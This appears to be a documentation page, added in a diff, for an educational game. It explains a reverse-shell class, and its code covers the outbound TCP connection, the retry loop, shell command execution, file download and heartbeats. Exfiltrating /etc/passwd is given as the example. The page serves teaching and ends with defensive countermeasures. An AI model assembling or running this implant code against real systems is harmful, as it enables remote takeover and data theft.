@@ -1,0 +1,170 @@
+---
+title: 'Reverse shell'
+description: 'How the ReverseShell class establishes an outbound TCP connection, executes commands, transfers files, and why outbound traffic is harder to detect than inbound.'
+keywords: ['reverse shell', 'TCP', 'socket', 'command execution', 'file transfer', 'heartbeat', 'cybersecurity education']
+---
+
+A **reverse shell** is a network connection where the compromised machine connects *out* to the attacker, rather than the attacker connecting *in*. This single design choice is what makes reverse shells so effective at bypassing firewalls — most networks allow outbound TCP connections freely, but block unsolicited inbound ones.
+
+The `ReverseShell` class in `cyber_modules/network_shell.py` is a fully functional demonstration of this technique.
+
+## How the TCP connection is established
+
+The shell connects to a hard-coded host on port `5050` using a standard TCP socket:
+
+```python
+import socket
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.connect((host, 5050))
+```
+
+- `AF_INET` — IPv4 addressing.
+- `SOCK_STREAM` — TCP (reliable, ordered, connection-oriented). This is important: TCP guarantees that command output arrives in full and in order, unlike UDP.
+
+### Status progression
+
+The `shell.status` attribute tracks the connection lifecycle for the game's UI:
+
+| Status | Meaning |
+|--------|---------|
+| `IDLE` | Not yet started |
+| `CONNECTING TO {host}...` | Initial connection attempt |
+| `CONNECTED TO {host}` | Session established |
+| `RETRYING: {error}...` | Connection failed, waiting to retry |
+
+## Retry and reconnect loop
+
+Real implants do not give up on a single failure. The shell continuously retries with a 2-second wait between attempts:
+
+```python
+while True:
+    try:
+        shell.status = f"CONNECTING TO {host}..."
+        sock.connect((host, 5050))
+        shell.status = f"CONNECTED TO {host}"
+        # ... command loop ...
+    except Exception as e:
+        shell.status = f"RETRYING: {e}..."
+        time.sleep(2)
+```
+
+This means the shell survives temporary network outages and will reconnect whenever the listener restarts — a key resilience feature of real C2 (command-and-control) implants.
+
+## The command execution loop
+
+Once connected, the shell reads commands from the socket, executes them, and sends back the output.
+
+### Cross-platform command aliases
+
+Because the game runs on Windows, Linux, and macOS, common Unix commands are mapped to their Windows equivalents at runtime:
+
+<Tabs>
+  <Tab title="Windows aliases">
+    | Unix command | Windows equivalent |
+    |--------------|--------------------|
+    | `ls` | `dir` |
+    | `pwd` | `echo %cd%` |
+    | `clear` | `cls` |
+    | `ifconfig` | `ipconfig` |
+    | `cat` | `type` |
+    | `grep` | `findstr` |
+  </Tab>
+  <Tab title="Cross-platform execution">
+    On Linux and macOS, commands are passed through unchanged. All commands are executed via:
+
+    ```python
+    proc = subprocess.Popen(
+        command,
+        shell=True,
+        stdout=subprocess.PIPE,
+        stderr=subprocess.PIPE
+    )
+    stdout, stderr = proc.communicate()
+    ```
+
+    Using `shell=True` means the full shell expansion, piping, and redirection features are available to the remote operator.
+  </Tab>
+</Tabs>
+
+### Special command: `cd`
+
+The `cd` command is handled separately because `subprocess.Popen` spawns a child process — any directory change inside that child is discarded when the process exits. To maintain a stateful working directory across commands, the shell calls `os.chdir()` directly in the Python process:
+
+```python
+if command.startswith("cd "):
+    path = command[3:].strip()
+    os.chdir(path)
+```
+
+Every command response includes the current working directory as a `[PATH: {cwd}]` tag, giving the remote operator a persistent sense of location.
+
+### Generic command execution
+
+For all other commands, stdout and stderr are both captured and sent back as a single response. This ensures error messages (such as "command not found" or permission errors) are visible to the remote operator — exactly as they would be in a real attacker session.
+
+## File transfer protocol
+
+The `download` command lets the remote operator retrieve files from the target machine. The protocol wraps the file in delimiter tags with base64-encoded content:
+
+```
+[FILE_BEGIN:filename]
+<base64-encoded file content>
+[FILE_END]
+```
+
+For example, to transfer `/etc/passwd`:
+
+```
+[FILE_BEGIN:passwd]
+dm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246...
+[FILE_END]
+```
+
+Base64 encoding is used because the socket stream is text-based. Binary files (images, executables, archives) would otherwise corrupt the stream with null bytes and control characters.
+
+<Note>
+  This is a simplified version of real file exfiltration protocols. Actual implants often add encryption, chunking for large files, and integrity checksums.
+</Note>
+
+## Heartbeat mechanism
+
+A background thread sends a `[HEARTBEAT]` message to the listener every 15 seconds:
+
+```python
+def _heartbeat(sock):
+    while True:
+        time.sleep(15)
+        sock.sendall(b"[HEARTBEAT]\n")
+
+threading.Thread(target=_heartbeat, args=(sock,), daemon=True).start()
+```
+
+The heartbeat serves two purposes:
+
+1. **Keep-alive** — some routers and NAT devices close idle TCP connections after a timeout. Regular traffic prevents this.
+2. **Disconnection detection** — if the `sendall` call raises an exception, the main loop knows the connection has dropped and triggers a reconnect.
+
+## Real-world implications
+
+<Warning>
+  Reverse shells are one of the most common techniques used in real intrusions. After initial access (via phishing, a vulnerable web app, or a misconfigured service), attackers almost always establish a reverse shell for persistent interactive access.
+
+  Notable frameworks that implement reverse shells include Metasploit's `meterpreter`, Cobalt Strike's `beacon`, and the open-source `Empire` post-exploitation framework.
+</Warning>
+
+## The educational lesson
+
+<Tip>
+  **Outbound traffic is often less monitored than inbound.** Most firewall rules focus on blocking inbound connections to protect services. A reverse shell exploits this asymmetry:
+
+  - The target machine initiates the connection, so it looks like normal outbound web traffic.
+  - Port 5050 (or 443, or 80) may be allowed by default.
+  - Without deep packet inspection or behavioral monitoring, the connection is invisible to basic firewall logs.
+
+  **Defensive countermeasures to look for:**
+  - Egress filtering rules that allow only known-good destinations
+  - Network monitoring tools that flag unexpected outbound connections
+  - Application allowlisting that prevents unknown executables from making network calls
+  - Endpoint Detection and Response (EDR) tools that detect shell spawning patterns
+</Tip>
